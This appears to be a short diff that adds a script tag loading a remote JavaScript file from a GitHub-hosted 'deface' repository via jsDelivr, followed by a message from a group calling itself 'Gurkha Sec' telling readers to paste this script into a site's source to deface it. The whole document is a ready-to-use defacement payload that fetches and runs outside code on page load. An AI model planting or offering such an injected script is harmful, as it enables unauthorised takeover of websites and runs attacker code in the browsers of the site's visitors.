@@ -1,0 +1,3 @@
+<script src="https://cdn.jsdelivr.net/gh/lumino1337/deface@main/replace.js"></script>
+
+THIS IS OUR JSO, JUST PASTE THIS JSO IN THE SRC AND YOUR SITE WILL BE DEFACED. REGARDS, GURKHA SEC!
